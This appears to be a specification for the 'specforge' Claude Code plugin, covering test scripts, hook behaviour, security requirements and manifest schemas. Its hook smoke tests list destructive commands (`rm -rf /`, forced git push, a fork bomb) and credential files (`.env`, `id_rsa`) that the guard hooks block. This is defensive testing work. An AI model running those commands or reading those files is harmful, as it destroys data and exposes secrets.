Test infrastructure and validation targets.

**Convention:** Test scripts are named `test-*.sh` or `validate-*.sh` under `scripts/`. CI discovers them via glob pattern `scripts/test-*.sh scripts/validate-*.sh`.

### TEST-001: Plugin Structure Validation Script

**Description:** Shell script (`scripts/validate-plugin.sh`) that validates the plugin directory structure, manifest integrity, referenced file paths, hooks.json validity, and version format. Called by CI and runnable locally.

**Acceptance Criteria:**

- [ ] File `scripts/validate-plugin.sh` exists and `test -x scripts/validate-plugin.sh` exits 0
- [ ] Running the script validates `.claude-plugin/plugin.json` is valid JSON
- [ ] Running the script checks that every file path in the `skills` and `agents` arrays of `plugin.json` resolves to an existing file relative to `.claude-plugin/`
- [ ] Running the script checks that `.claude-plugin/hooks/hooks.json` is valid JSON
- [ ] Running the script checks that every `command` path in hooks.json resolves to an existing `.sh` file (after replacing `${CLAUDE_PLUGIN_ROOT}` with `.claude-plugin`)
- [ ] Running the script checks that `.claude-plugin/marketplace.json` is valid JSON
- [ ] Running the script checks that the `version` field in `plugin.json` matches `^\d+\.\d+\.\d+$`
- [ ] The script prints `"PASS: <check-name>"` or `"FAIL: <check-name>"` for each validation
- [ ] The script prints a final summary: `"X of Y validations passed"`
- [ ] The script exits 0 if all validations pass, exits 1 if any fail

**Dependencies:** INFRA-001, INFRA-005

---

### TEST-002: Hook Smoke Tests

**Description:** Test script (`scripts/test-hooks.sh`) that smoke-tests all 6 Claude Code hooks by piping JSON payloads to stdin and asserting exit codes and stderr content.

**Acceptance Criteria:**

- [ ] File `scripts/test-hooks.sh` exists and `test -x scripts/test-hooks.sh` exits 0
- [ ] Tests `protect-files.sh` with at least 4 cases: allowed file (exit 0), `.env` (exit 2, stderr matches "BLOCKED"), `id_rsa` (exit 2, stderr matches "BLOCKED"), `.env.example` (exit 0)
- [ ] Tests `validate-bash.sh` with at least 4 cases: `ls` (exit 0), `rm -rf /` (exit 2, stderr matches "BLOCKED"), `git push --force` (exit 2, stderr matches "BLOCKED"), fork bomb literal (exit 2, stderr matches "BLOCKED")
- [ ] Tests `validate-pr.sh` with at least 3 cases: clean PR (exit 0), PR with "I have" in title (exit 2), non-PR command (exit 0)
- [ ] Tests `post-edit.sh` with at least 2 cases: valid file path (exit 0), empty/missing file path (exit 0)
- [ ] Tests `format-changed.sh` with `{"stop_hook_active": true}` input (exit 0)
- [ ] Tests `verify-quality.sh` with `{"stop_hook_active": true}` input (exit 0)
- [ ] Each test prints `"PASS: <test-name>"` or `"FAIL: <test-name>"`
- [ ] Final line: `"X of Y tests passed"`
- [ ] Script exits 0 if all pass, 1 if any fail

**Dependencies:** INFRA-004, FUNC-001, FUNC-002, FUNC-003, FUNC-004, FUNC-005, FUNC-006

---

### TEST-003: Scaffold Projection End-to-End Test

**Description:** Test script (`scripts/test-scaffold.sh`) that runs the init/scaffold logic against a fresh temporary directory, validates all expected files exist, hooks are executable, git repo is initialized, and `.specforge-version` is correct.

**Acceptance Criteria:**

- [ ] File `scripts/test-scaffold.sh` exists and `test -x scripts/test-scaffold.sh` exits 0
- [ ] Creates a temporary directory with `mktemp -d`
- [ ] Runs the init/scaffold logic targeting the temporary directory
- [ ] Validates at least these files exist in the temp dir: `.specify/WORKFLOW.md`, `.specify/templates/constitution-template.md`, `scripts/hooks/pre-commit`, `scripts/hooks/commit-msg`, `ci/principles/commit-gate.md`, `ci/principles/pr-gate.md`, `ci/principles/release-gate.md`, `prompts/initializer-prompt.md`, `prompts/coding-prompt.md`,
  `.prettierrc.json`
- [ ] Validates `CLAUDE.md` exists (created from template)
- [ ] Validates `.specforge-version` exists and its content matches regex `^\d+\.\d+\.\d+$`
- [ ] Validates `scripts/hooks/pre-commit` is executable: `test -x <path>` exits 0
- [ ] Validates `scripts/hooks/commit-msg` is executable: `test -x <path>` exits 0
- [ ] Validates `git -C <temp-dir> rev-parse --is-inside-work-tree` exits 0 (it is a git repo)
- [ ] Uses `trap 'rm -rf "$TMPDIR"' EXIT` to clean up the temporary directory
- [ ] Each check prints `"PASS: <check-name>"` or `"FAIL: <check-name>"`
- [ ] Final summary: `"X of Y validations passed"`
- [ ] Exits 0 if all pass, 1 if any fail

**Dependencies:** INFRA-001, FUNC-014

---

### TEST-004: Upgrade Three-Tier Test

**Description:** Test script (`scripts/test-upgrade.sh`) that validates the upgrade command respects the three-tier file classification. Sets up a scaffolded project, modifies files in each tier, runs upgrade, and asserts correct overwrite/skip behavior.

**Acceptance Criteria:**

- [ ] File `scripts/test-upgrade.sh` exists and `test -x scripts/test-upgrade.sh` exits 0
- [ ] Creates a scaffolded temporary directory (runs init first)
- [ ] Appends the string `CANARY_OVERWRITE` to a file in the overwrite tier (e.g., `ci/principles/commit-gate.md`)
- [ ] Appends the string `CANARY_SKIP` to a file in the skip tier (e.g., `.specify/memory/constitution.md`, first creating it if needed)
- [ ] Writes `0.0.1` to `.specforge-version` (simulating an old version)
- [ ] Runs the upgrade logic
- [ ] Validates `grep -c CANARY_OVERWRITE ci/principles/commit-gate.md` outputs `0` (canary was removed by overwrite)
- [ ] Validates `grep -c CANARY_SKIP .specify/memory/constitution.md` outputs `1` (canary preserved by skip)
- [ ] Validates `.specforge-version` contains the current plugin version (not `0.0.1`)
- [ ] Uses trap to clean up on exit
- [ ] Exits 0 if all pass, 1 if any fail

**Dependencies:** FUNC-014, FUNC-015

---

### TEST-005: Commit-msg Hook Validation Tests

**Description:** Test script (`scripts/test-commit-msg.sh`) that exercises the commit-msg hook against a comprehensive set of valid and invalid commit messages.

**Acceptance Criteria:**

- [ ] File `scripts/test-commit-msg.sh` exists and `test -x scripts/test-commit-msg.sh` exits 0
- [ ] Tests passing messages: `feat: add login`, `fix(auth): resolve token expiry`, `docs: update README`, `chore: bump dependencies`, `refactor(core): simplify parser`, `fix: update Claude Code docs`
- [ ] Tests failing messages: `added login` (no conventional prefix), `feat: I have added login` (AI-ism), `feat: seamless integration` (marketing), empty message, message with emoji, `fix: update Claude integration` (standalone Claude), `feat: robust error handling` (marketing), message with `Co-Authored-By` trailer (error, not warning)
- [ ] Tests warning-only messages: subject at 73 characters (passes with warning), body with `WIP` marker (passes with warning)
- [ ] Each test creates a temp file with the message, passes it to the hook as `$1`, and checks the exit code
- [ ] Passing messages must exit 0; failing messages must exit 1; warning messages must exit 0
- [ ] Each test prints `"PASS: <test-description>"` or `"FAIL: <test-description>"`
- [ ] Final summary: `"X of Y tests passed"`
- [ ] Exits 0 if all pass, 1 if any fail

**Dependencies:** FUNC-019

---

### TEST-006: JSON Key Standardization Verification

**Description:** Test script (`scripts/test-json-keys.sh`) that scans all hook scripts for the old `input.*` JSON key pattern and verifies the `tool_input.*` standardization is complete. Prevents regression.

**Acceptance Criteria:**

- [ ] File `scripts/test-json-keys.sh` exists and `test -x scripts/test-json-keys.sh` exits 0
- [ ] Scans every `.sh` file under `.claude/hooks/` and `.claude-plugin/hooks/` (both locations)
- [ ] Fails if any file contains `.input` as a jq accessor (old pattern)
- [ ] Passes if all hook files that parse JSON use `.tool_input` as the jq accessor
- [ ] For each violation, prints the filename and the matching line content
- [ ] If no violations found, prints "All hook scripts use tool_input. No legacy 'input' keys found."
- [ ] Exits 0 if no violations, exits 1 if any found

**Dependencies:** INFRA-004

---

## Non-Functional Requirements

### Performance

- All PreToolUse and PostToolUse hooks complete in under 2 seconds for single-file operations
- Stop hooks (`format-changed.sh`, `verify-quality.sh`) begin producing stdout output within 2 seconds of invocation
- `verify-quality.sh` total runtime is bounded by the project's test suite duration (the hook itself adds < 1 second overhead)
- `/specforge init` scaffold projection completes in under 10 seconds for a typical project
- `/specforge upgrade` completes in under 15 seconds including diff generation

### Security

- All hooks fail open (exit 0) on JSON parsing errors -- they never block legitimate work due to hook bugs
- PreToolUse hooks use exit code 2 to block operations (not exit 1, which signals hook error)
- No hook script logs secrets, credentials, or tokens to stdout or stderr
- All hook scripts start with `set -euo pipefail` and `trap 'exit 0' ERR` for fail-open behavior. Intentional blocks use explicit `exit 2`. Non-hook shell scripts use `set -euo pipefail` without the trap.
- No use of `eval` in any hook script
- No unquoted variable expansion in command positions (all variables are double-quoted)
- All JSON parsing in hooks uses `jq` with fail-open fallback (exit 0) if jq is unavailable
- GitHub artifact attestation using `actions/attest-build-provenance` on all releases

### Platform Support

- macOS (Intel and Apple Silicon): primary development and testing platform
- Linux (Ubuntu 22.04+, Debian 12+): CI and server environments
- Windows via WSL2: supported but not primary test target
- Bash >= 4.0: minimum version
- jq: recommended for JSON parsing in hooks. If unavailable, hooks fail open (exit 0)
- All scripts use `#!/bin/bash` shebang (not `#!/usr/bin/env bash`)
- No GNU-specific flags that differ on macOS (e.g., `sed -i` requires `''` on macOS; avoid or handle both)

### Size

- Total plugin size (all files under `.claude-plugin/`) under 500KB
- No binary assets, compiled code, or vendored dependencies
- No Node.js, Python packages, or other runtime dependencies required for plugin functionality

---

## Appendix A: Plugin Schema Definitions

Canonical schema examples derived from observed patterns in the memvid/mind plugin and
official Anthropic plugins. These define the structure for INFRA-001 and INFRA-005.

### A.1: plugin.json

```json
{
  "name": "specforge",
  "version": "1.0.0",
  "description": "Spec-driven development hooks, skills, and scaffold projection for autonomous coding projects",
  "author": "specforge contributors",
  "license": "MIT",
  "repository": "https://github.com/schwichtgit/claude-project-foundation",
  "skills": [
    {
      "path": "skills/specforge/SKILL.md"
    }
  ],
  "agents": [
    {
      "path": "agents/initializer.md"
    },
    {
      "path": "agents/coder.md"
    }
  ],
  "hooks": "hooks/hooks.json"
}
```

Notes:

- No `commands` array. Init and upgrade are sub-commands of the specforge skill.
- All paths are relative to `.claude-plugin/`.
- The `hooks` field is a string path to the hooks manifest, not an inline object.

### A.2: hooks.json

```json
{
  "PreToolUse": [
    {
      "matcher": "Write|Edit",
      "command": "${CLAUDE_PLUGIN_ROOT}/hooks/protect-files.sh"
    },
    {
      "matcher": "Bash",
      "command": "${CLAUDE_PLUGIN_ROOT}/hooks/validate-bash.sh"
    },
    {
      "matcher": "Bash",
      "command": "${CLAUDE_PLUGIN_ROOT}/hooks/validate-pr.sh"
    }
  ],
  "PostToolUse": [
    {
      "matcher": "Write|Edit",
      "command": "${CLAUDE_PLUGIN_ROOT}/hooks/post-edit.sh"
    }
  ],
  "Stop": [
    {
      "command": "${CLAUDE_PLUGIN_ROOT}/hooks/format-changed.sh"
    },
    {
      "command": "${CLAUDE_PLUGIN_ROOT}/hooks/verify-quality.sh"
    }
  ]
}
```

Notes:

- `${CLAUDE_PLUGIN_ROOT}` is resolved by Claude Code at runtime to the plugin's installation directory.
- `matcher` field uses regex-style alternation for tool name matching.
- Stop hooks have no `matcher`; they fire on every stop event.
- Array order matters for Stop hooks: `format-changed.sh` runs before `verify-quality.sh`.

### A.3: marketplace.json

```json
{
  "name": "specforge",
  "plugins": [
    {
      "source": {
        "type": "git",
        "repo": "https://github.com/schwichtgit/claude-project-foundation",
        "ref": "v1.0.0"
      }
    }
  ]
}
```

Notes:

- `source.type` is `"git"` for Git-hosted plugins.
- `source.ref` is the git ref (tag, branch, or commit SHA) to install from.
- The marketplace file enables `claude plugin add` from a registry.

### A.4: SKILL.md Frontmatter

```yaml
---
name: specforge
description: Spec-driven development workflow with 9 sub-commands for autonomous coding projects
argument-hint: "<sub-command> (constitution|spec|clarify|plan|features|analyze|setup|init|upgrade)"
---
```

Notes:

- Frontmatter uses YAML between `---` delimiters at the top of the SKILL.md file.
- `name` is the skill's invocation name (used as `/specforge`).
- `description` is shown in skill listings and help text.
- `argument-hint` documents the expected arguments for the skill.
- The body of SKILL.md below the frontmatter contains the skill's prompt instructions.
